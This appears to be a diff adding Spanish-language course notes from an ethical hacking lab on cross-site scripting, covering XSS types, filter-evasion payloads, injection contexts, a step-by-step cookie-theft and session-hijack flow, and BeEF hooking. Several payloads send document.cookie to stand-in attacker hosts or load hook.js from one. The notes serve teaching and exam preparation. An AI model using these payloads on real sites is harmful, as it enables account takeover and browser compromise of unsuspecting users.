@@ -1,0 +1,267 @@
+=====================================================
+  XSS - Cross-Site Scripting
+  D1n0 | Ethical Hacking Lab | U-TAD 2025-2026
+=====================================================
+
+----------------------------------------------------------------
+1. QUE ES XSS
+----------------------------------------------------------------
+
+XSS ocurre cuando una aplicacion incluye datos controlados por
+el usuario en la respuesta HTML sin sanitizarlos correctamente.
+El navegador de la victima interpreta ese contenido como codigo
+JavaScript legitimo y lo ejecuta.
+
+Impacto directo:
+  - Robo de cookies de sesion (secuestro de cuenta)
+  - Keylogging en la pagina activa
+  - Redireccion a sitios maliciosos
+  - Phishing overlay (formularios de login falsos)
+  - Escaneo de red interna (desde el navegador victima)
+  - Punto de entrada para BeEF (post-explotacion avanzada)
+
+----------------------------------------------------------------
+2. TIPOS DE XSS
+----------------------------------------------------------------
+
+REFLEJADO (Reflected)
+  El payload va en la peticion (GET/POST) y se refleja
+  directamente en la respuesta sin almacenarse.
+
+  Flujo:
+    Atacante crafta URL maliciosa
+    --> Victima hace clic en la URL
+    --> Servidor refleja el payload en la respuesta
+    --> Navegador ejecuta el script
+
+  Ejemplo URL:
+    http://target/search?q=<script>alert(1)</script>
+
+  Caracteristicas:
+    - No persiste: solo afecta a quien carga esa URL concreta
+    - Requiere que la victima haga clic (ingenieria social)
+    - Util para robo de cookies puntual o hookear con BeEF
+
+
+ALMACENADO (Stored / Persistent)
+  El payload se guarda en la base de datos del servidor
+  (comentario, nombre de usuario, mensaje...) y se sirve
+  a todos los usuarios que visiten esa pagina.
+
+  Flujo:
+    Atacante inyecta payload en un campo del formulario
+    --> Servidor almacena el payload en BD
+    --> Cualquier usuario que cargue la pagina ejecuta el script
+
+  Caracteristicas:
+    - Persiste: afecta a todos los visitantes
+    - No requiere enganar a la victima con una URL
+    - Mucho mas peligroso y valioso para BeEF
+
+  Ejemplo tipico: campo de comentarios, nombre de perfil, titulo
+
+
+DOM-BASED
+  El payload nunca llega al servidor. Se inyecta y ejecuta
+  directamente en el DOM del navegador via JavaScript.
+
+  Ocurre cuando JS del lado cliente usa datos no sanitizados:
+    document.write(location.hash)
+    element.innerHTML = location.search
+
+  Flujo:
+    Atacante crafta URL con payload en el fragmento (#)
+    --> Navegador carga la pagina
+    --> JS del cliente lee location.hash y lo inserta en el DOM
+    --> Navegador ejecuta el payload
+
+  Caracteristicas:
+    - El payload no pasa por el servidor (no aparece en logs)
+    - Mas dificil de detectar
+    - Mismas consecuencias que los otros tipos
+
+----------------------------------------------------------------
+3. PAYLOADS BASICOS
+----------------------------------------------------------------
+
+Test de confirmacion:
+  <script>alert(1)</script>
+  <script>alert('XSS')</script>
+  <script>alert(document.domain)</script>
+
+Robo de cookie (sin HttpOnly):
+  <script>document.location='http://ATACANTE/steal?c='+document.cookie</script>
+  <script>new Image().src='http://ATACANTE/steal?c='+document.cookie</script>
+  <script>fetch('http://ATACANTE/steal?c='+document.cookie)</script>
+
+Hookear con BeEF:
+  <script src="http://ATACANTE_IP:3000/hook.js"></script>
+
+----------------------------------------------------------------
+4. EVASION DE FILTROS
+----------------------------------------------------------------
+
+-- Cambio de etiqueta (si <script> esta filtrado) --
+
+  <img src=x onerror="alert(1)">
+  <svg onload="alert(1)">
+  <body onload="alert(1)">
+  <input autofocus onfocus="alert(1)">
+  <a href="javascript:alert(1)">click</a>
+  <iframe src="javascript:alert(1)">
+  <details open ontoggle="alert(1)">
+
+-- Cambio de mayusculas/minusculas (filtros case-sensitive) --
+
+  <ScRiPt>alert(1)</sCrIpT>
+  <IMG SRC=x ONERROR="alert(1)">
+
+-- Espacios y separadores alternativos --
+
+  <img src=x	onerror=alert(1)>     (tab entre atributos)
+  <img src=x\nonerror=alert(1)>      (newline)
+
+-- Codificacion HTML de atributos --
+
+  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">X</a>
+  (javascript:alert(1) en entidades HTML)
+
+-- Sin comillas en atributos --
+
+  <img src=x onerror=alert(1)>
+
+-- Sin parentesis (si estan filtrados) --
+
+  <img src=x onerror="alert`1`">
+  <script>throw onerror=alert,1</script>
+
+-- Truncar el tag de cierre --
+
+  <script>alert(1)//
+  <script>alert(1)/*
+
+-- Anidado (si el filtro borra <script> una sola vez) --
+
+  <scr<script>ipt>alert(1)</scr</script>ipt>
+
+-- Codificacion URL (en parametros GET) --
+
+  %3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+-- Usando SVG y namespaces --
+
+  <svg><script>alert(1)</script></svg>
+  <math><mtext><script>alert(1)</script></mtext></math>
+
+----------------------------------------------------------------
+5. IDENTIFICAR DONDE INYECTAR
+----------------------------------------------------------------
+
+Buscar puntos de reflexion:
+  - Campos de busqueda (?q=, ?search=, ?name=...)
+  - Mensajes de error que repiten la entrada del usuario
+  - Comentarios, nombres de usuario, titulos en formularios
+  - Cabeceras HTTP reflejadas (User-Agent, Referer)
+  - Fragmentos de URL (#hash) en apps con mucho JS
+
+Proceso en BurpSuite:
+  1. Intercepta la peticion
+  2. Introduce una cadena unica (ej: xsstest123)
+  3. Busca en la respuesta donde aparece esa cadena
+  4. Analiza el contexto:
+       - Dentro de <tag>AQUI</tag>    --> payload directo
+       - Dentro de atributo="AQUI"    --> cierra comilla primero: "><script>...
+       - Dentro de JS: var x="AQUI"   --> cierra string: ";alert(1)//
+
+----------------------------------------------------------------
+6. CONTEXTOS DE INYECCION
+----------------------------------------------------------------
+
+Contexto HTML (dentro de un tag):
+  Input:  <div>AQUI</div>
+  Payload: <script>alert(1)</script>
+
+Contexto de atributo (dentro de un valor):
+  Input:  <input value="AQUI">
+  Payload: "><script>alert(1)</script>
+  o:       " onmouseover="alert(1)
+
+Contexto JavaScript (dentro de una variable):
+  Input:  var x = "AQUI";
+  Payload: ";alert(1)//
+  o:       "-alert(1)-"
+
+Contexto de atributo href:
+  Input:  <a href="AQUI">
+  Payload: javascript:alert(1)
+
+----------------------------------------------------------------
+7. ROBO DE COOKIES - FLUJO COMPLETO
+----------------------------------------------------------------
+
+Objetivo: robar la cookie de sesion de la victima para
+suplantar su identidad sin conocer su contrasena.
+
+Requisito: la cookie NO debe tener el flag HttpOnly.
+(Con HttpOnly, JS no puede leer document.cookie)
+
+Paso 1: Montar servidor receptor en Kali
+  python3 -m http.server 8888
+  o con nc: nc -lvnp 8888
+
+Paso 2: Inyectar payload en campo vulnerable
+  <script>new Image().src='http://[KALI_IP]:8888/?c='+document.cookie</script>
+
+Paso 3: Cuando la victima carga la pagina, llega la peticion:
+  GET /?c=PHPSESSID=abc123def456 HTTP/1.1
+
+Paso 4: Usar la cookie robada
+  En BurpSuite Repeater o en el navegador:
+  Abre DevTools > Application > Cookies
+  Cambia el valor de PHPSESSID por el robado
+  Recarga la pagina --> sesion secuestrada
+
+----------------------------------------------------------------
+8. CONECTAR XSS CON BEEF
+----------------------------------------------------------------
+
+El XSS es el vector de entrada. BeEF es lo que haces
+una vez que tienes ejecucion de JS en el navegador victima.
+
+Payload para hookear:
+  <script src="http://[KALI_IP]:3000/hook.js"></script>
+
+Una vez hookeado, el navegador aparece en:
+  http://127.0.0.1:3000/ui/panel
+
+Desde ahi ejecutas modulos (ver ApuntesXSS-BeEF.txt).
+
+Tipo de XSS mas valioso para BeEF:
+  Almacenado --> hookea a todos los visitantes automaticamente
+
+----------------------------------------------------------------
+9. RESUMEN RAPIDO PARA EXAMEN
+----------------------------------------------------------------
+
+  Tipo         Persiste  Requiere clic  Vector
+  -----------------------------------------------------
+  Reflejado    NO        SI             URL trampa
+  Almacenado   SI        NO             Campo de formulario
+  DOM-based    NO        SI (URL #)     JS del cliente
+
+  Payload minimo:  <script>alert(1)</script>
+  Robo cookie:     <script>new Image().src='http://KALI/?c='+document.cookie</script>
+  BeEF hook:       <script src="http://KALI:3000/hook.js"></script>
+  Filtro bypass:   <img src=x onerror=alert(1)>
+
+  Contextos:
+    HTML puro        --> payload directo
+    Atributo="valor" --> cierra con ">
+    JS var x="valor" --> cierra con ";
+
+  HttpOnly = JS no puede leer cookies (document.cookie vacio)
+  Sin HttpOnly = cookies accesibles desde JS
+
+  [Ver ApuntesXSS-BeEF.txt para post-explotacion con BeEF]
+
+=====================================================
